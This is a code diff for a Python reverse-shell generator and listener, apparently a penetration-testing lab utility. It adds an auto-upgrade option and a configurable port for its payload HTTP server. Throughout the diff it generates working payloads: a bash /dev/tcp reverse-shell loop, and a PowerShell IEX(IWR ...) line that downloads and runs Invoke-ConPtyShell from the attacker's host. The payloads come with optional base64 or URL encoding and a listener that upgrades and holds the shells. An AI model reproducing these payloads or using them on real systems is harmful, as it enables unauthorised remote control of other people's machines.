@@ -30,11 +30,14 @@ def get_ip_address(interface):
         print(f"Error: Could not get IP address for interface {interface}.")
         sys.exit(1)
 
-def create_reverse_shell(ip, port, os, encode):
+def create_reverse_shell(ip, port, os, encode, http_server_port, auto_upgrade):
     if os == 'linux':
         reverse_shell_cmd = f"bash -c 'while true; do bash -i >& /dev/tcp/{ip}/{port} 0>&1 || exit; sleep 1; done'"
     elif os == 'windows':
-        reverse_shell_cmd = f"""IEX (New-Object System.Net.Webclient).DownloadString("http://{ip}:8000/powercat.ps1");powercat -c {ip} -p {port} -e powershell"""
+        if auto_upgrade:
+            reverse_shell_cmd = f"{ip} {port}"
+        else:
+            reverse_shell_cmd = f"""IEX(IWR http://{ip}:{http_server_port}/Invoke-ConPtyShell.ps1 -UseBasicParsing);Invoke-ConPtyShell {ip} {port}"""
     if encode == 'base64':
         reverse_shell_cmd = base64.b64encode(reverse_shell_cmd.encode()).decode()
     elif encode == 'url':
@@ -44,6 +47,9 @@ def create_reverse_shell(ip, port, os, encode):
 def linux_shell(conn, exit_the_whole_thing):
     # Full TTY plz 😌
     conn.sendall("stty raw -echo < /dev/tty; python3 -c 'import pty; pty.spawn(\"/bin/bash\")' || python -c 'import pty; pty.spawn(\"/bin/bash\")' || true \n export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116;\n".encode())
+    shell(conn, exit_the_whole_thing)
+
+def shell(conn, exit_the_whole_thing):
     while True:
         # Create queues for thread communication
         command_queue = queue.Queue()
@@ -98,35 +104,22 @@ def linux_shell(conn, exit_the_whole_thing):
             sys.exit(0)
         receive_thread.join()
 
-def windows_shell(conn, exit_the_whole_thing):
-    while True:
-        try:
-            data = conn.recv(1024)
-            if not data:
-                break
-            decoded = data.decode()
-            print(decoded, end='')
+def windows_shell(conn, exit_the_whole_thing, auto_upgrade, ip, http_server_port):
+    if auto_upgrade:
+        conn.sendall("powershell -ep Bypass\n".encode())
+        conn.sendall(f"IEX(IWR http://{ip}:{http_server_port}/Invoke-ConPtyShell.ps1 -UseBasicParsing);Invoke-ConPtyShell -Upgrade -Rows 38 -Cols 116\n".encode())
+    shell(conn, exit_the_whole_thing)
 
-            # Get user input and send it
-            user_input = input()
-            if user_input == 'exit':
-                exit_the_whole_thing.set()
-                break
-            conn.sendall((user_input + '\n').encode())
-
-        except:
-            break
-
-def start_http_server():
+def start_http_server(port):
       # Start a simple HTTP server to serve PowerShell Empire files
-      http_server_thread = threading.Thread(target=lambda: os.system(f'cd /usr/share/powershell-empire/empire/server/data/module_source/management/ && python3 -m http.server 8000'))
+      http_server_thread = threading.Thread(target=lambda: os.system(f'cd /usr/share/make-me-a-shell && python3 -m http.server {port}'))
       http_server_thread.daemon = True
       http_server_thread.start()
-      print("Started HTTP server on port 8000 serving PowerShell Empire management modules")
+      print(f"Started HTTP server on port {port} serving ConPtyShell")
 
-def listen_for_connection(port, os):
+def listen_for_connection(port, os, http_server_port, ip, auto_upgrade):
     if os == 'windows':
-        start_http_server()
+        start_http_server(http_server_port)
 
     # Use socket to listen for incoming connections
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
@@ -144,7 +137,7 @@ def listen_for_connection(port, os):
                     if os == 'linux':
                         linux_shell(conn, exit_the_whole_thing)
                     elif os == 'windows':
-                        windows_shell(conn, exit_the_whole_thing)
+                        windows_shell(conn, exit_the_whole_thing, auto_upgrade, ip, http_server_port)
 
             except KeyboardInterrupt:
                 print("Fuck, lost connection, reconnecting...")
@@ -164,6 +157,8 @@ def main():
     parser = argparse.ArgumentParser(description="Make me a reverse shell.")
     parser.add_argument('-i', '--interface', default='tun0', help='Network interface to get IP address from (default: tun0)')
     parser.add_argument('-p', '--port', type=int, default=0, help='Port number to use for the reverse shell, use 0 for random port')
+    parser.add_argument('-a', '--auto-upgrade', action='store_true', help='Auto upgrade the shell (if you have a bare remote connection from exploit)')
+    parser.add_argument('-P', '--http-server-port', type=int, default=0, help='Port number to use for the HTTP server, use 0 for random port')
     parser.add_argument('-o', '--os', choices=['linux', 'windows'], default='linux', help='Operating system to use for the reverse shell')
     parser.add_argument('-e', '--encode', choices=['base64', 'url', 'none'], default='none', help='Encode the reverse shell command')
 
@@ -172,9 +167,12 @@ def main():
     if args.port == 0:
         args.port = get_random_port()
 
+    if args.http_server_port == 0:
+        args.http_server_port = get_random_port()
+
     ip = get_ip_address(args.interface)
-    create_reverse_shell(ip, args.port, args.os, args.encode)
-    listen_for_connection(args.port, args.os)
+    create_reverse_shell(ip, args.port, args.os, args.encode, args.http_server_port, args.auto_upgrade)
+    listen_for_connection(args.port, args.os, args.http_server_port, ip, args.auto_upgrade)
 
 if __name__ == "__main__":
     main()
